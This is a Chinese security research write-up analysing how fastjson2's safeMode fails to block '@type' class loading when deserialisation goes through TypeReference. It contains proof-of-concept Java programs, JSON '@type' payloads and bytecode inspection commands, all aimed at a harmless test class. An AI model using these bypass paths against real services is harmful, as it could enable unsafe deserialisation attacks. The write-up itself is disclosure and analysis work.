# Fastjson2 泛型擦除下的 autoType 绕过
> QIANXIN Team
> 来源：https://forum.butian.net/share/5005

fastjson2 的 safeMode 被广泛视为反序列化安全的兜底开关。但它的生效范围取决于 `checkAutoType` 的调用位置——`checkAutoType` 只在以字符串为入参的 `getObjectReader(String, Class, long)` 重载中被调用。当反序列化的目标类型由 `TypeReference` 承载时，调用链改走 `getObjectReader(Type, boolean)`，该重载从头到尾不经过 `checkAutoType`。safeMode 在这条路径上不产生拦截效果。

## 环境

```php

mvn dependency:get -Dartifact=com.alibaba.fastjson2:fastjson2:2.0.43
mvn dependency:get -Dartifact=com.alibaba.fastjson2:fastjson2:2.0.51


mkdir -p /tmp/com/bypass
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785139395915-89c3f346-1112-421e-bf51-c0d50765f6ac.png)

## 入口在哪

`ObjectReaderProvider` 是 fastjson2 的反序列化器注册中心。两个缓存字段：

core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderProvider.java

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785139662940-337c330f-35ed-404e-b777-df369d8f919a.png)

String 入口（行 514-526）——有 `checkAutoType`：

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785139833677-2c1079b7-e92c-45e3-a319-1a6a5869a482.png)

Type 入口（行 709 + 727-746）——无 `checkAutoType`：

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785139896046-315913c2-a6c0-4f53-a23b-315b2b14731e.png)

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785139960670-6ac23dc9-d055-4229-92a9-5317c0b81b15.png)

签名里没有 `long features` 参数——`SupportAutoType` 标记位无法传入。缓存命中时连 `getObjectReaderInternal` 都不进入。

`checkAutoType`（行 538-555）在 safeMode 下返回 `null`，不抛异常：

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785140070002-a2e82a51-0a84-4a32-b7c9-d9d972a44e0c.png)

调用方 `getObjectReader(String,...)` 收到 null 后自身返回 null，最终由上层（`ObjectReaderImplObject.readObject` 的 `getObjectReaderAutoType` 调用点）决定是否报错。

![](https://cdn.nlark.com/yuque/__mermaid_v3/60d4fefb59b8a5c5c9649a926937b777.svg)

`checkAutoType` 在 Type 路径完整调用链中出现次数：零。

* * *

## 谁在信任谁

从 `JSON.parseObject(json, TypeReference)` 到 XClass 的 ObjectReader 被创建，链条上每个节点都不经过 `checkAutoType`。

**第 1 层**——`JSON.java` 行 920-940：

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785140294277-bcec58da-3658-4456-990f-7366f67185a4.png)

**第 2 层**——`ObjectReaderProvider.getObjectReader(Type, boolean)`（行 727）：先查 `cache.get(objectType)`，未命中进入 `getObjectReaderInternal`。

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785140688379-8ecdabfb-a102-4354-8303-19b46afdc33e.png)

**第 3 层**——`getObjectReaderInternal`（行 749-805），遍历 modules 和 ParameterizedType 解析：

```php
private ObjectReader getObjectReaderInternal(Type objectType, boolean fieldBased) {
    for (ObjectReaderModule module : modules) {
        objectReader = module.getObjectReader(this, objectType);
        if (objectReader != null) {
            ObjectReader previous = fieldBased
                    ? cacheFieldBased.putIfAbsent(objectType, objectReader)
                    : cache.putIfAbsent(objectType, objectReader);
            return previous != null ? previous : objectReader;
        }
    }
    if (objectType instanceof ParameterizedType) {
        ParameterizedType pt = (ParameterizedType) objectType;
        Type rawType = pt.getRawType();
        
    }
}
```

**第 4 层**——`ObjectReaderBaseModule.getObjectReader(provider, type)`（行 1429）。对 `ParameterizedType` 的 rawType 做实例判断，分发到对应工厂方法：

```php

public ObjectReader getObjectReader(ObjectReaderProvider provider, Type type) {
    if (type instanceof Class) {
        Class<?> clazz = (Class<?>) type;
        if (Map.class.isAssignableFrom(clazz)) {
            
            return ObjectReaderImplMap.of(type, clazz, 0);
        }
        if (List.class.isAssignableFrom(clazz)) {
            return ObjectReaderImplList.of(type, clazz, 0);
        }
    }
    if (type instanceof ParameterizedType) {
        ParameterizedType pt = (ParameterizedType) type;
        Type rawType = pt.getRawType();
        if (rawType instanceof Class) {
            Class<?> rawClass = (Class<?>) rawType;
            if (Map.class.isAssignableFrom(rawClass)) {
                
                return ObjectReaderImplMap.of(type, rawClass, 0);
            }
            if (List.class.isAssignableFrom(rawClass)) {
                return ObjectReaderImplList.of(type, rawClass, 0);
            }
        }
    }
}
```

当 `type` 只是裸 `Map.class` 时，`ObjectReaderImplMap.of()` 收到的 `fieldType` 不是 `ParameterizedType`，行 98 的 `instanceof ParameterizedType` 检查不通过，不会创建 `ObjectReaderImplMapTyped`。此时必须靠 JSON 中的 `@type` 走 String 路径来解析值的具体类型——这就是 safeMode 可以拦截的路径。

**第 5 层**——`ObjectReaderImplMap.of()`（行 43-193）。核心任务是从 `ParameterizedType` 的 `actualTypeArguments` 中提取 valueType（行 98-109）：

```php
if (fieldType instanceof ParameterizedType) {
    ParameterizedType pt = (ParameterizedType) fieldType;
    Type[] args = pt.getActualTypeArguments();
    if (args.length == 2 && ...) {
        Type keyType = args[0];
        Type valueType = args[1];           
        return new ObjectReaderImplMapTyped(
            mapType, instanceType, keyType, valueType, 0, builder
        );
    }
}
```

**第 6 层**——`ObjectReaderImplMapTyped`。构造函数（行 34-58）仅存储 valueType 字段，valueReader 的解析发生在两个时机。

构造期——`createInstance`（行 66-132），当输入 Map 的值是 JSONObject/JSONArray/Map/Collection 时触发（行 90-94）：

```php

if (valueType == Object.class) {
    
} else if (valueClass == JSONObject.class || ...) {
    if (valueObjectReader == null) {
        valueObjectReader = provider.getObjectReader(valueType);
        
    }
}
```

`valueType == Object.class` 的分支什么也不做——这是 C 组（`TypeRef<Map<String, Object>>`）被拦截的根因：valueReader 未创建，后续 value 读取无法走 Type 路径。

运行时——`readObject`（行 276-395），行 382 的 valueReader 懒加载：

```php

if (valueObjectReader == null) {
    valueObjectReader = jsonReader.getObjectReader(valueType);
    
}
Object value = valueObjectReader.readObject(jsonReader, valueType, fieldName, 0);
```

六层调用链上 `checkAutoType` 调用次数为零。

* * *

## 泛型的痕迹

六层调用链走到最后，关键在于 `ObjectReaderImplMap.of()` 从 `ParameterizedType.actualTypeArguments[1]` 中取出了 `XClass.class`。这个 `Class<?>` 对象之所以在运行时存在，是因为 JVM §4.7.9.1 的 Signature 属性。

创建 `GenAnon.java`，用 TypeReference 声明泛型，编译后反编译匿名子类：

GenAnon.java —— 编译后产生 GenAnon$1.class

```php

import com.alibaba.fastjson2.TypeReference;

public class GenAnon {
    public static void main(String[] args) {
        TypeReference<java.util.Map<String, com.bypass.XClass>> ref =
            new TypeReference<java.util.Map<String, com.bypass.XClass>>() {};
        System.out.println(ref.getType());
    }
}
```

编译并反编译匿名子类：

```php
JAR=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.43/fastjson2-2.0.43.jar
  javac -cp "$JAR:/tmp" /tmp/GenAnon.java -d /tmp
  javap -v -c -p /tmp/GenAnon\$1.class
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785141823814-21e1a2af-5b16-4af1-acbc-cea8e0eab764.png)

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785141749914-afecede6-4d4e-4eb2-b173-858325eaaecb.png)

### XClass 从 class 文件到 ObjectReader 的传递

![](https://cdn.nlark.com/yuque/__mermaid_v3/ea241dba77d27e2314fd250b958bea62.svg)

前四阶段均在 fastjson2 外部——分别由 javac、JVM、反射 API 完成。第五阶段进入 fastjson2 的 Type 路径，不经过 checkAutoType。

* * *

## cache 抢跑

`ObjectReaderProvider` 行 149-150 的 `ConcurrentHashMap<Type, ObjectReader>` 缓存是绕过的放大器。

`getObjectReader(Type, boolean)`（行 727）先 `cache.get(objectType)`。首次未命中时进入 `getObjectReaderInternal`，在 module 解析成功后写入缓存（行 755-757）：

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785141958550-b0a27a9c-59e9-4df1-ae07-fbd8a16b4f1f.png)

后续同一个 `ParameterizedTypeImpl` 再次请求时，`cache.get()` 直接返回——不进入 module 迭代、不进入 `ObjectReaderImplMap.of()`，与 `checkAutoType` 相关的任何逻辑都不触发。

先创建依赖类：

com/bypass/XClass.java—— 观测类，static{} 打桩

```php
package com.bypass;

public class XClass {
    static { System.out.println("[XClass] <clinit>"); }

    private String name;
    private int value;

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public int getValue() { return value; }
    public void setValue(int value) { this.value = value; }

    public String toString() {
        return "XClass{name='" + name + "', value=" + value + "}";
    }
}
```

/tmp/CacheWarmup.java —— 观测首次与二次解析的耗时差异

```php
import com.alibaba.fastjson2.*;
import java.util.Map;

public class CacheWarmup {
    public static void main(String[] args) {
        String json = "{\"x\":{\"@type\":\"com.bypass.XClass\",\"name\":\"w\",\"value\":1}}";
        TypeReference<Map<String, com.bypass.XClass>> typeRef =
            new TypeReference<Map<String, com.bypass.XClass>>() {};

        
        long t0 = System.nanoTime();
        Map<String, com.bypass.XClass> r1 = JSON.parseObject(json, typeRef,
            JSONReader.Feature.SupportAutoType);
        long t1 = System.nanoTime();
        System.out.println("首次: " + (t1 - t0) / 1000 + " µs  |  value class: "
            + r1.get("x").getClass().getName());

        
        long t2 = System.nanoTime();
        Map<String, com.bypass.XClass> r2 = JSON.parseObject(json, typeRef,
            JSONReader.Feature.SupportAutoType);
        long t3 = System.nanoTime();
        System.out.println("二次: " + (t3 - t2) / 1000 + " µs  |  value class: "
            + r2.get("x").getClass().getName());
    }
}
```

编译运行：

```php
JAR=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.43/fastjson2-2.0.43.jar
javac -cp "$JAR" /tmp/XClass.java -d /tmp
javac -cp "$JAR:/tmp" /tmp/CacheWarmup.java -d /tmp
java -cp "/tmp:$JAR" CacheWarmup
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785142293376-633c25d0-7b5f-4118-aa88-c6522adeaa54.png)

统计 `ObjectReaderProvider` 中每个方法的 `checkAutoType` 调用次数：

```php
JAR=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.43/fastjson2-2.0.43.jar
javap -c -p -classpath "$JAR" \
    com.alibaba.fastjson2.reader.ObjectReaderProvider \
    | awk '
      /public|protected|private/ && /\(.*\)/{
        if(in_m) print method " -> checkAutoType: " ct
        method=$0; in_m=1; ct=0; next
      }
      /^$/ && in_m{ print method " -> checkAutoType: " ct; in_m=0 }
      in_m && /checkAutoType/{ ct++ }
    '
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785142938645-cb054411-2553-42db-99c6-bb33b89ec803.png)  
① getObjectReader(String, Class, long) → checkAutoType: 1 String 入口，整个 Provider 中唯一调用 checkAutoType 的重载

② getObjectReader(Type) → checkAutoType: 0

Type 单参入口，不调 checkAutoType

③ getObjectReader(Type, boolean) → checkAutoType: 0

Type 双参入口，不调 checkAutoType，是 JSON.parseObject(TypeReference) 的调用目标

④ getObjectReaderInternal(Type, boolean) → checkAutoType: 0

cache miss 后的内部递归入口，同样不调 checkAutoType

checkAutoType 只覆盖 String 入参的路径。两个 Type 重载及内部递归方法全部不调 checkAutoType，safeMode 对 TypeReference 入口无拦截能力。

### cache 状态转换

![](https://cdn.nlark.com/yuque/__mermaid_v3/ecc060f05e595c697fb7e82cbeef8e1c.svg)

上图上半部分为首次解析（cache miss），下半部分为后续解析（cache hit）。首次走 module 迭代和 putIfAbsent，后续直接从 ConcurrentHashMap.get 返回——后续不再进入 module、不再进入 ObjectReaderImplMap.of、不再进入与 checkAutoType 相关的任何调用链。

* * *

## 三组绕行，三组降级

SafeModeMatrix.java —— 六组入口在 safeMode 下的行为对比

```php
import com.alibaba.fastjson2.*;
import java.util.*;

public class SafeModeMatrix {

    static String mapJson  = "{\"x\":{\"@type\":\"com.bypass.XClass\",\"name\":\"t\",\"value\":1}}";
    static String listJson = "[{\"@type\":\"com.bypass.XClass\",\"name\":\"t\",\"value\":1}]";
    static String arrJson  = "[[{\"@type\":\"com.bypass.XClass\",\"name\":\"t\",\"value\":1}]]";

    record R(String id, String desc, String outcome, String detail) {}

    static R test(String id, String desc, Runnable r) {
        try { r.run(); return new R(id, desc, "PASS", null); }
        catch (JSONException e) { return new R(id, desc, "BLOCK", e.getMessage()); }
        catch (Exception e) { return new R(id, desc, "ERROR",
            e.getClass().getSimpleName() + ": " + e.getMessage()); }
    }

    public static void main(String[] args) {
        System.out.println("fastjson2: " + JSON.class.getPackage().getImplementationVersion());
        System.out.println("safeMode:  "
            + System.getProperty("fastjson2.parser.safeMode", "NOT SET") + "\n");

        List<R> results = new ArrayList<>();

        results.add(test("A", "TypeRef<Map<String,XClass>>",
            () -> JSON.parseObject(mapJson,
                new TypeReference<Map<String, com.bypass.XClass>>() {},
                JSONReader.Feature.SupportAutoType)));

        results.add(test("B", "parseObject(json, Object.class)",
            () -> JSON.parseObject(mapJson, Object.class)));

        results.add(test("C", "TypeRef<Map<String,Object>>",
            () -> JSON.parseObject(mapJson,
                new TypeReference<Map<String, Object>>() {},
                JSONReader.Feature.SupportAutoType)));

        results.add(test("D", "parseObject(json, XClass.class)",
            () -> JSON.parseObject(
                "{\"@type\":\"com.bypass.XClass\",\"name\":\"d\",\"value\":4}",
                com.bypass.XClass.class)));

        results.add(test("E", "TypeRef<List<XClass>>",
            () -> JSON.parseObject(listJson,
                new TypeReference<List<com.bypass.XClass>>() {},
                JSONReader.Feature.SupportAutoType)));

        results.add(test("F", "TypeRef<List<XClass[]>>",
            () -> JSON.parseObject(arrJson,
                new TypeReference<List<com.bypass.XClass[]>>() {},
                JSONReader.Feature.SupportAutoType)));

        for (R r : results)
            System.out.printf("%-4s %-39s %-6s %s%n",
                r.id, r.desc, r.outcome,
                r.detail != null ? r.detail : "-");
    }
}
```

ProveBypass.java —— 验证解析结果值的实际类型

```php
import com.alibaba.fastjson2.*;
import java.util.Map;

public class ProveBypass {
    public static void main(String[] args) {
        String json = "{\"x\":{\"@type\":\"com.bypass.XClass\",\"name\":\"bypass\",\"value\":42}}";
        System.out.println("safeMode: " + System.getProperty("fastjson2.parser.safeMode"));

        System.out.println("\n--- A: TypeRef<Map<String,XClass>> ---");
        Map<String, com.bypass.XClass> r1 = JSON.parseObject(json,
            new TypeReference<Map<String, com.bypass.XClass>>() {},
            JSONReader.Feature.SupportAutoType);
        Object v1 = r1.get("x");
        System.out.println("value class: " + v1.getClass().getName());
        System.out.println("value: " + v1);

        System.out.println("\n--- B: parseObject(Object.class) ---");
        Object r2 = JSON.parseObject(json, Object.class);
        Object v2 = ((Map<?,?>) r2).get("x");
        System.out.println("value class: " + v2.getClass().getName());
    }
}
```

编译并运行

```php
JAR=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.43/fastjson2-2.0.43.jar
javac -cp "$JAR" /tmp/XClass.java -d /tmp
javac -cp "$JAR:/tmp" /tmp/SafeModeMatrix.java -d /tmp
javac -cp "$JAR:/tmp" /tmp/ProveBypass.java -d /tmp

java -cp "/tmp:$JAR" -Dfastjson2.parser.safeMode=true SafeModeMatrix

java -cp "/tmp:$JAR" -Dfastjson2.parser.safeMode=true ProveBypass
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785143968862-3aec43df-8a85-4bf4-bcf3-4ae029706592.png)

① SafeModeMatrix 全 PASS

safeMode 对 String 路径不抛异常——@type 被静默忽略，值降级为 JSONObject。

全 PASS 不意味着安全，必须检查值的实际类型。

② ProveBypass A: value class: com.bypass.XClass

TypeReference 路径在 safeMode=true 下成功将 @type 解析并实例化为 XClass。

\[XClass\] <clinit> 出现在控制台，证明静态初始化块已执行。

safeMode 在此路径不生效。

③ ProveBypass B: value class: com.alibaba.fastjson2.JSONObject

String 路径上 @type 被静默忽略，值降级为 JSONObject，XClass 未被加载。

**safeMode 在此路径生效。**

safeMode 在 String 路径上不抛异常——`checkAutoType` 返回 null 后，@type 被静默忽略，值降级为 `JSONObject`。拦截表现形式是值的实际类型为 `JSONObject`，而非异常退出。

* * *

## @type 路径分叉

C 组被拦截而 A 组绕行，根因在 `ObjectReaderImplObject.readObject`（行 64-130）对 JSON 中 `@type` 键的分发逻辑：

```php
if (hash == HASH_TYPE) {
    boolean supportAutoType = context.isEnabled(JSONReader.Feature.SupportAutoType);
    ObjectReader autoTypeObjectReader;
    if (supportAutoType) {
        long typeHash = jsonReader.readTypeHashCode();
        autoTypeObjectReader = context.getObjectReaderAutoType(typeHash);
        if (autoTypeObjectReader == null) {
            typeName = jsonReader.getString();
            autoTypeObjectReader = context.getObjectReaderAutoType(typeName, null);
        }
    } else {
        typeName = jsonReader.readString();
        autoTypeObjectReader = context.getObjectReaderAutoType(typeName, null);
    }
    if (autoTypeObjectReader != null)
        return autoTypeObjectReader.readObject(jsonReader, fieldType, fieldName, features);
}
```

`getObjectReaderAutoType(String, Class)`（`JSONReader.java` 行 4202-4211）是分叉点：

```php
public ObjectReader getObjectReaderAutoType(String typeName, Class expectClass) {
    if (autoTypeBeforeHandler != null) {
        Class<?> autoTypeClass = autoTypeBeforeHandler.apply(typeName, expectClass, features);
        if (autoTypeClass != null) {
            boolean fieldBased = (features & Feature.FieldBased.mask) != 0;
            return provider.getObjectReader(autoTypeClass, fieldBased);
            
        }
    }
    return provider.getObjectReader(typeName, expectClass, features);
    
}
```

当外层通过 TypeReference<Map<String, XClass>> 已构建了 `ObjectReaderImplMapTyped`（`valueType = XClass.class`），Map 的 value 读取不再经过 `ObjectReaderImplObject.readObject`。`ObjectReaderImplMapTyped.readObject` 行 382 直接 `jsonReader.getObjectReader(valueType)`——Type 路径。

`SupportAutoType` 标记位的行为：safeMode 的拦截逻辑只在 `checkAutoType` 内部生效，而 Type 路径从不调用 `checkAutoType`——传不传 `SupportAutoType` 对 TypeReference 入口没有影响。去掉 flag 重新运行 ProveBypass，XClass 依然被实例化。

* * *

## 换个版本打

diff 2.0.43 和 2.0.51 的 `ObjectReaderProvider`：

```php
JAR43=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.43/fastjson2-2.0.43.jar
JAR51=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.51/fastjson2-2.0.51.jar
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785144105109-b592d007-d518-4067-bb8c-f32ee711df0d.png)

过滤出 `getObjectReader` 和 `checkAutoType` 差异行：

```php
diff -u \
    <(javap -c -p -classpath "$JAR43" com.alibaba.fastjson2.reader.ObjectReaderProvider) \
    <(javap -c -p -classpath "$JAR51" com.alibaba.fastjson2.reader.ObjectReaderProvider) \
    | grep -E "^[+-].*getObjectReader|^[+-].*checkAutoType"
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785144821888-630095ba-f18f-463b-ab4c-3d6c80f3e842.png)

### 2.0.43 vs 2.0.51

|  |  |  |
| --- | --- | --- |
| 方法 | 2.0.43 | 2.0.51 |
| getObjectReader(Type, boolean) 调 checkAutoType? | 否 | 否 |
| getObjectReader(String, Class, long) 调 checkAutoType? | 是 | 是 |
| checkAutoType 签名 | (String, Class, long) | (String, Class, long) |
| 新增 Type 版本 checkAutoType? | — | 否 |

2.0.51 在 Type 路径上没有补丁。

* * *

## cache key 的等价性

不同 `new TypeReference<Map<String, XClass>>(){}` 产生的 `ParameterizedTypeImpl` 实例，在 `ConcurrentHashMap` 中是否被视为同一 key？如果 equals 为假，cache 跨请求共享就不成立。

JDKTypeCmp.java —— 验证两次 new TypeReference 的 Type 等价性

```php
import com.alibaba.fastjson2.TypeReference;
import java.lang.reflect.*;
import java.util.concurrent.ConcurrentHashMap;

public class JDKTypeCmp {
    public static void main(String[] args) {
        System.out.println("JDK: " + System.getProperty("java.version"));

        TypeReference<java.util.Map<String, com.bypass.XClass>> r1 =
            new TypeReference<java.util.Map<String, com.bypass.XClass>>() {};
        TypeReference<java.util.Map<String, com.bypass.XClass>> r2 =
            new TypeReference<java.util.Map<String, com.bypass.XClass>>() {};
        Type t1 = r1.getType();
        Type t2 = r2.getType();

        System.out.println("equals  : " + t1.equals(t2));
        System.out.println("hash t1 : " + t1.hashCode()
            + " (0x" + Integer.toHexString(t1.hashCode()) + ")");
        System.out.println("hash t2 : " + t2.hashCode()
            + " (0x" + Integer.toHexString(t2.hashCode()) + ")");
        System.out.println("hash_eq : " + (t1.hashCode() == t2.hashCode()));

        ConcurrentHashMap<Type, String> m = new ConcurrentHashMap<>();
        m.put(t1, "a");
        m.put(t2, "b");
        System.out.println("CHM.size: " + m.size() + " (1=等价, 2=不等价)");
    }
}
```

编译运行：

```php
JAR=~/.m2/repository/com/alibaba/fastjson2/fastjson2/2.0.43/fastjson2-2.0.43.jar
javac -cp "$JAR:/tmp" /tmp/JDKTypeCmp.java -d /tmp
java -cp "/tmp:$JAR" JDKTypeCmp
```

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785144979927-0b0ad515-fc2d-4d99-9541-90a2e9c4e388.png)

`equals=true`、hashCode 相同、CHM.size=1——两个独立 `new TypeReference` 产生的 Type 实例在 ConcurrentHashMap 中被视为同一 key。第一次解析写入的缓存条目会被之后所有同型声明命中。`ParameterizedTypeImpl.equals()` 比较了 `rawType` 和 `actualTypeArguments` 的逐元素等同性——只要泛型声明一致，不同匿名子类实例产出的 Type 就等价。

* * *

## source-sink 全链路

一条 payload，两个入口，走出两条完全不同的路径。

```php
String payload = "{\"x\":{\"@type\":\"com.bypass.XClass\",\"name\":\"bypass\",\"value\":42}}";

 
 Map<String, XClass> r1 = JSON.parseObject(payload,
     new TypeReference<Map<String, com.bypass.XClass>>() {},
     JSONReader.Feature.SupportAutoType);

 
 Object r2 = JSON.parseObject(payload, Object.class);
```

`TypeReference` 匿名子类的 Signature 属性 在 JVM 类加载时被解析为 `ParameterizedTypeImpl`，`XClass.class` 以 `Class<?>` 对象放入 `actualTypeArguments[1]`。不是字符串，不走 `checkAutoType`。

![](https://cdn.nlark.com/yuque/0/2026/png/40517814/1785228659263-4e9442d5-24d3-4739-8b7d-600630b6383d.png)

## Type 入参即放行

前面六层调用链的主干是 `JSON.parseObject(json, TypeReference)` → `getObjectReader(Type, boolean)`。以下三条策略表明同样的效果可以通过不同的入口达成。

-   **策略一：利用** `getObjectReaderAutoType` **中的 Type 分支**。`ObjectReaderImplObject.readObject`（行 64）处理 JSON 中的 `@type` 时，调用 `context.getObjectReaderAutoType(typeName, null)`。该方法内部（`JSONReader.java` 行 4202-4211）在 `autoTypeBeforeHandler` 返回非 null 的 `Class<?>` 时走 `provider.getObjectReader(autoTypeClass, fieldBased)`——Type 路径。默认的 `DEFAULT_AUTO_TYPE_BEFORE_HANDLER` 始终返回 null，但调用方可通过 `JSONReader.Context` 注册自定义 Handler。一个注册了自定义 `AutoTypeBeforeHandler` 的业务模块——即使 safeMode=true——只要 Handler 对某个 className 返回了对应的 Class，该类便走 Type 路径绕过 checkAutoType。
-   **策略二：操作** `ObjectReaderImplMapTyped` **的 valueReader 缓存**。`ObjectReaderImplMapTyped` 有两个解析 valueReader 的时机：构造期 `createInstance`（行 94）和运行时 `readObject`（行 382），都调 `provider.getObjectReader(valueType)`——Type 路径。`createInstance` 在 Map 的值是 JSONObject/JSONArray/Map/Collection 时被触发。预热一次解析（用一个无害 JSON 触发 `createInstance`），valueReader 被缓存在实例字段中，后续 `readObject` 直接复用，不再经过任何解析。
-   **策略三：绕过 Provider，直接使用 ObjectReaderCreator**。`ObjectReaderCreator.createObjectReader(Class, Type, boolean, ObjectReaderProvider)` 不经过 `ObjectReaderProvider.getObjectReader` 的任何重载。调用方分布在 `ObjectReaderBaseModule` 和多个 `ObjectReaderImpl*` 中：

```php

if (objectReader == null) {
    ObjectReaderCreator creator = getCreator();
    objectReader = creator.createObjectReader(objectClass, objectType, fieldBased, this);
    
}
```

以下五个入口与前文主干路径等效，都因入参是 Type 而跳过 checkAutoType：

|  |  |  |  |
| --- | --- | --- | --- |
| 调用位置 | 行号 | 调用形式 | 触发条件 |
| getObjectReaderInternal | 798 | getObjectReader(rawClass, fieldBased) | ParameterizedType 的 rawType 是 Class |
| ObjectReaderImplMapTyped.createInstance | 94 | provider.getObjectReader(valueType) | Map 值是 JSONObject/Map/Collection |
| ObjectReaderImplMapTyped.readObject | 382 | jsonReader.getObjectReader(valueType) | valueObjectReader 未初始化 |
| getObjectReaderAutoType | 4207 | provider.getObjectReader(autoTypeClass, fieldBased) | Handler 返回非 null Class |
| ObjectReaderCreator | — | creator.createObjectReader(...) | 被各 Module 直接调用 |

在 2.0.43 和 2.0.51 中，以上所有入口的字节码均不包含 `checkAutoType` 调用。关闭此面的方式是在 `getObjectReader(Type, boolean)` 方法体内对遍历出来的每个 `Class` 调用 `checkAutoType`——在字节码层补齐一条 `invokevirtual checkAutoType` 到 Type 分支上。

## 与官方修复的对比

社区提交的 [PR #7695](https://github.com/alibaba/fastjson2/pull/7695) 对 AutoType 路径做了安全加固，改动了四个文件：

-   `ObjectReaderProvider.java`——checkAutoType 白名单验证
-   `ContextAutoTypeBeforeHandler.java`——输入验证
-   `TypeUtils.java`——loadClass 输入校验
-   `AutoTypeValidationTest.java`——回归测试

维护者 wenshao 在 [Issue #7702](https://github.com/alibaba/fastjson2/issues/7702) 中说明该 PR 已关闭未合入，正式修复将通过独立 PR 发布，临时缓解措施为 `-Dfastjson2.parser.safeMode=true`。

PR 的全部改动都在 `checkAutoType` 和 `TypeUtils.loadClass` 中。这两个方法只在 String 路径上被调用——即 `parseObject(json, Class)` 或 JSON 中 `@type` 经 `getObjectReaderAutoType` → `getObjectReader(String)` 的路径。javap 统计已展示 Type 重载及 getObjectReaderInternal 中 checkAutoType 调用次数为零，ProveBypass 实测确认 safeMode 对 TypeReference 入口不拦截。

String 路径上，PR 的加固和 SafeMode 都在生效。TypeReference 路径上，两者都不生效——这条路不经过它们所在的代码位置。

## 附录

[fastjson2/core/src/main/java/com/alibaba/fastjson2 at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/tree/2.0.43/core/src/main/java/com/alibaba/fastjson2) [fastjson2/core/src/main/java/com/alibaba/fastjson2/reader at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/tree/2.0.43/core/src/main/java/com/alibaba/fastjson2/reader) [fastjson2/core/src/main/java/com/alibaba/fastjson2/JSON.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/JSON.java) [fastjson2/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderProvider.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderProvider.java)[fastjson2/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderBaseModule.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderBaseModule.java)

[fastjson2/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderImplMap.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderImplMap.java)

[fastjson2/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderImplMapTyped.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderImplMapTyped.java)

[fastjson2/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderImplObject.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderImplObject.java)

[fastjson2/core/src/main/java/com/alibaba/fastjson2/JSONReader.java at 2.0.43 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.43/core/src/main/java/com/alibaba/fastjson2/JSONReader.java)

对照版本用：

[fastjson2/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderProvider.java at 2.0.51 · alibaba/fastjson2](https://github.com/alibaba/fastjson2/blob/2.0.51/core/src/main/java/com/alibaba/fastjson2/reader/ObjectReaderProvider.java)
